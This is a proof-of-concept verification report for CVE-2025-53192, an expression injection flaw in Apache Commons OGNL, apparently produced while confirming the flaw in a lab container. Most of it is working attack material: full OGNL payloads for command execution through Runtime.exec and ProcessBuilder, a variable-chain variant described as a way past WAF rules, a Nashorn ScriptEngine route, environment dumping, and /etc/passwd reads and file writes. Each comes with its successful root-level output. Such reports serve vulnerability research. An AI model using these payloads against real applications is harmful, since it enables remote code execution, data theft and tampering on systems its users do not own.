# PoC Verification Report: CVE-2025-53192

## CVE ID
CVE-2025-53192

## Vulnerability Summary
Apache Commons OGNL (Object-Graph Navigation Library) contains an **unrestricted expression injection vulnerability** in its expression evaluation engine. The `DefaultClassResolver` loads ANY class via `ClassLoader.loadClass()` with zero restrictions, and `DefaultMemberAccess` only checks Java visibility modifiers (not class-level deny lists). This allows **Remote Code Execution (RCE)** when user-controlled input is passed to `Ognl.getValue()`, `Ognl.setValue()`, or `Ognl.parseExpression()`.

- **CVSS**: 8.8 (HIGH)
- **Affected**: ALL versions (project retired, no fix)
- **Impact**: Full RCE, arbitrary file read/write, information disclosure

---

## Verification Status

### **CONFIRMED**

All 4 attack vectors across 4 PoC scripts succeeded against the vulnerable container `cve-2025-53192-vulnerable` running Apache Commons OGNL 4.0-SNAPSHOT on OpenJDK 11.0.30.

---

## PoC Scripts

### Primary PoC: `poc.py`
- **Vector**: Static method invocation — `@java.lang.Runtime@getRuntime().exec()`
- **AST Code Path**: `ASTStaticMethod` → `OgnlRuntime.callStaticMethod()` → `DefaultClassResolver.classForName()` → `ClassLoader.loadClass()` (NO CHECK) → `OgnlRuntime.invokeMethod()` → `Method.invoke()`
- **Description**: Python orchestrator that deploys a Java exploit class into the vulnerable container, compiles it, and executes it. The Java class creates an `OgnlContext` with default (unrestricted) settings and evaluates a malicious OGNL expression that calls `Runtime.getRuntime().exec()`.
- **Usage**: `python3 poc.py [container_name] [command]`

### Vector 2: `poc_vector2.py`
- **Vector**: Constructor invocation — `(new java.lang.ProcessBuilder(...)).start()`
- **AST Code Path**: `ASTCtor` → `OgnlRuntime.callConstructor()` → `DefaultClassResolver.classForName()` → `ClassLoader.loadClass("java.lang.ProcessBuilder")` (NO CHECK) → `Constructor.newInstance()`
- **Description**: Uses OGNL's constructor syntax to instantiate `ProcessBuilder` and call `.start()`. This uses a DIFFERENT AST node (`ASTCtor`) than Vector 1 (`ASTStaticMethod`), demonstrating that even if static method invocation were somehow blocked, object construction provides an alternative RCE path.
- **Usage**: `python3 poc_vector2.py [container_name] [command]`

### Vector 3: `poc_vector3.py`
- **Vector**: Advanced techniques — OGNL variable chain, ScriptEngine, info exfiltration
- **Sub-vectors**:
  - **A**: OGNL variable assignment chain using `(#rt=@Runtime@getRuntime(), #cmd=new String[]{...}, #rt.exec(#cmd))`. Uses `ASTSequence` + `ASTAssign` + `ASTVarRef` nodes — a different code path that splits the attack across sub-expressions, potentially bypassing WAF rules.
  - **B**: Nashorn ScriptEngine execution — creates a JavaScript engine via OGNL and evaluates JavaScript that calls Java APIs. Achieves RCE **without directly calling Runtime.exec() from OGNL**.
  - **C**: Environment variable exfiltration via `@System@getenv()` — demonstrates information disclosure without spawning any process.
- **Usage**: `python3 poc_vector3.py [container_name]`

### Vector 4: `poc_vector4.py`
- **Vector**: File I/O — arbitrary file read and write
- **Sub-vectors**:
  - **A**: Read `/etc/passwd` using `new java.util.Scanner(new java.io.File(...)).useDelimiter("\\A").next()` — pure Java I/O, no shell process needed
  - **B**: Write a proof marker file and verify it was written correctly
- **Description**: Demonstrates that the impact extends beyond RCE to direct file system access through Java I/O classes, without needing to spawn a shell process.
- **Usage**: `python3 poc_vector4.py [container_name]`

---

## Test Results

### Vector 1: Static Method Invocation (poc.py)

**Command**:
```bash
python3 poc/poc.py
```

**Output**:
```
======================================================================
  CVE-2025-53192: Apache Commons OGNL Expression Injection → RCE
======================================================================

  Target container:  cve-2025-53192-vulnerable
  Attack vector:     @java.lang.Runtime@getRuntime().exec()
  Command:           id
  Vulnerability:     Unrestricted OGNL expression evaluation
  Root cause:        DefaultClassResolver loads ANY class (no deny list)

  [1/5] Checking target container is running... OK
  [2/5] Deploying Java exploit to container... OK
  [3/5] Compiling exploit... OK
  [4/5] Executing OGNL expression injection... OK
  [5/5] Parsing results...

  OGNL Expression:
    @java.lang.Runtime@getRuntime().exec(new java.lang.String[]{"sh","-c","id"})

  [EXPLOIT SUCCEEDED] Command output:
  ┌──────────────────────────────────────────────
  │ uid=0(root) gid=0(root) groups=0(root)
  └──────────────────────────────────────────────

  ✓ CVE-2025-53192 CONFIRMED — Remote Code Execution via OGNL injection

  Attack chain:
    1. Attacker-controlled string → Ognl.parseExpression()
    2. ASTStaticMethod → OgnlRuntime.callStaticMethod()
    3. DefaultClassResolver.classForName('java.lang.Runtime') → ClassLoader.loadClass() → NO CHECK
    4. OgnlRuntime.invokeMethod() → Runtime.getRuntime().exec() → RCE
```

**Result**: **SUCCESS** — Arbitrary command execution confirmed as root.

---

### Vector 2: ProcessBuilder Constructor Chain (poc_vector2.py)

**Command**:
```bash
python3 poc_vector2.py
```

**Output**:
```
======================================================================
  CVE-2025-53192 Vector 2: ProcessBuilder Constructor Chain
======================================================================

  Code path: ASTCtor → OgnlRuntime.callConstructor() → DefaultClassResolver
  Contrast:  Vector 1 uses ASTStaticMethod; this uses ASTCtor (different AST node)

  [1/3] Deploying exploit... OK
  [2/3] Compiling... OK
  [3/3] Executing OGNL constructor injection... OK

  Expression: (new java.lang.ProcessBuilder(new java.lang.String[]{"sh","-c","whoami"})).start()
  [EXPLOIT SUCCEEDED] → root

  ✓ RCE via ProcessBuilder constructor chain confirmed
```

**Result**: **SUCCESS** — RCE via constructor invocation (different AST path from Vector 1).

---

### Vector 3: Advanced Techniques (poc_vector3.py)

**Command**:
```bash
python3 poc_vector3.py
```

**Output**:
```
======================================================================
  CVE-2025-53192 Vector 3: Advanced Techniques
======================================================================

  Sub-vector A: OGNL variable chain (ASTSequence + ASTAssign)
  Sub-vector B: Nashorn ScriptEngine (JavaScript → Java RCE)
  Sub-vector C: Environment exfiltration (no shell process)

  [1/3] Deploying exploit... OK
  [2/3] Compiling... OK
  [3/3] Executing advanced techniques... OK

  [Sub-vector A] OGNL Variable Assignment Chain:
  AST path: ASTSequence → ASTAssign(#rt) → ASTAssign(#cmd) → ASTMethod(#rt.exec)
  [SUCCEEDED] → Linux 4a9f22666f39 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 aarch64 aarch64 GNU/Linux

  [Sub-vector B] Nashorn ScriptEngine Execution:
  Technique: OGNL creates ScriptEngineManager → JS engine → eval(JavaScript)
  [SUCCEEDED] → uid=0(root) gid=0(root) groups=0(root)
  Note: RCE achieved WITHOUT directly calling Runtime.exec() from OGNL

  [Sub-vector C] Environment Variable Exfiltration:
  │ ENV_VARS_COUNT: 9
  │ PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  │ JAVA_HOME=/opt/java/openjdk
  │ CLASSPATH=/lab:/lab/commons-ognl.jar:/lab/javassist.jar
  ✓ Info exfiltration without spawning any process

  ✓ All 3 advanced techniques confirmed
```

**Result**: **SUCCESS** — All 3 sub-vectors confirmed (variable chaining, ScriptEngine bypass, info exfiltration).

---

### Vector 4: File I/O (poc_vector4.py)

**Command**:
```bash
python3 poc_vector4.py
```

**Output**:
```
======================================================================
  CVE-2025-53192 Vector 4: File I/O via OGNL (no shell for reads)
======================================================================

  Sub-vector A: Read /etc/passwd via Scanner+File (pure Java I/O)
  Sub-vector B: Write proof marker file + verify via OGNL

  [1/3] Deploying exploit... OK
  [2/3] Compiling... OK
  [3/3] Executing file I/O exploits... OK

  [Sub-vector A] Arbitrary File Read (/etc/passwd):
  │ root:x:0:0:root:/root:/bin/bash
  │ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  │ bin:x:2:2:bin:/bin:/usr/sbin/nologin
  │ sys:x:3:3:sys:/dev:/usr/sbin/nologin
  │ sync:x:4:65534:sync:/bin:/bin/sync
  │ ... (14 more lines)
  ✓ Arbitrary file read confirmed (no shell process needed)

  [Sub-vector B] Arbitrary File Write + Verify:
  Written content: CVE-2025-53192-FILE-IO-VECTOR
  ✓ Arbitrary file write confirmed

  ✓ CVE-2025-53192 File I/O impact confirmed
```

**Result**: **SUCCESS** — Both arbitrary file read and file write confirmed.

---

## Summary Table

| PoC Script | Vector | AST Code Path | Result |
|------------|--------|---------------|--------|
| `poc.py` | `@Runtime@getRuntime().exec()` | ASTStaticMethod → callStaticMethod() | **SUCCESS** |
| `poc_vector2.py` | `new ProcessBuilder().start()` | ASTCtor → callConstructor() | **SUCCESS** |
| `poc_vector3.py` (A) | OGNL variable chain `(#rt=..., #rt.exec())` | ASTSequence → ASTAssign → ASTMethod | **SUCCESS** |
| `poc_vector3.py` (B) | Nashorn ScriptEngine → JS → Java RCE | ASTCtor → ASTMethod(getEngineByName) → ASTMethod(eval) | **SUCCESS** |
| `poc_vector3.py` (C) | `@System@getenv()` info exfil | ASTStaticMethod (no process spawn) | **SUCCESS** |
| `poc_vector4.py` (A) | File read via Scanner+File | ASTCtor(File) → ASTCtor(Scanner) → ASTMethod | **SUCCESS** |
| `poc_vector4.py` (B) | File write + verify | ASTStaticMethod(exec) + ASTCtor(Scanner) | **SUCCESS** |

**All 7 sub-vectors across 4 PoC scripts: CONFIRMED**

---

## Lab Environment

- **Container**: `cve-2025-53192-vulnerable`
- **Image**: Custom multi-stage build (Maven + Eclipse Temurin JDK 11)
- **Java**: OpenJDK 11.0.30 (Temurin)
- **Library**: Apache Commons OGNL 4.0-SNAPSHOT (built from source, commit `003345d`)
- **Classpath**: `/lab/commons-ognl.jar:/lab/javassist.jar`
- **Running as**: root (uid=0)

### Start Lab
```bash
docker compose up -d
```

### Run PoCs
```bash
cd poc/
python3 poc.py                              # Vector 1: Runtime.exec()
python3 poc_vector2.py                      # Vector 2: ProcessBuilder
python3 poc_vector3.py                      # Vector 3: Variable chain + ScriptEngine
python3 poc_vector4.py                      # Vector 4: File I/O
```

---

## Notes

1. **No network service**: This is a library-level vulnerability. The PoC runs Java code inside the container that directly calls the OGNL API. There is no HTTP endpoint to attack.

2. **No authentication**: The vulnerability is in the library's expression evaluation engine. Authentication depends entirely on the consuming application.

3. **No fix available**: The Apache Commons OGNL project is retired/dormant. All versions are vulnerable. The advisory recommends "find an alternative or restrict access to trusted users."

4. **OGNL reflection chain limitation**: Attempted to use `Method.invoke()` via OGNL reflection for a pure reflection-based RCE chain, but OGNL's `OgnlRuntime.callAppropriateMethod()` does not handle `Method.invoke(Object, Object...)` varargs correctly — it causes `IllegalArgumentException: argument type mismatch`. This is an OGNL method resolution quirk, not a security feature. The alternative ScriptEngine approach was used instead.

5. **Multiple AST code paths**: The 4 vectors exercise distinct OGNL AST nodes:
   - `ASTStaticMethod` (Vector 1) — `@Class@method()` syntax
   - `ASTCtor` (Vector 2) — `new Class()` syntax
   - `ASTSequence` + `ASTAssign` (Vector 3A) — `(#var=..., #var.method())` syntax
   - `ASTMethod` via ScriptEngine (Vector 3B) — indirect RCE via JavaScript engine
   - File I/O classes (Vector 4) — `Scanner`, `File` instantiation without shell

6. **JDK compatibility**: Tested on JDK 11 (no `--add-opens` flags needed). JDK 17+ would require `--add-opens java.base/java.lang=ALL-UNNAMED`. JDK 8 also works. Nashorn ScriptEngine (Vector 3B) is available on JDK 8-14 (deprecated in 11, removed in 15+).

7. **Real-world relevance**: While this CVE is about the library itself, the same OGNL injection primitives have been exploited extensively in downstream frameworks: Apache Struts 2 (CVE-2018-11776), Atlassian Confluence (CVE-2022-26134, CVE-2021-26084). Any application using Commons OGNL to evaluate user-controllable expressions is directly vulnerable.
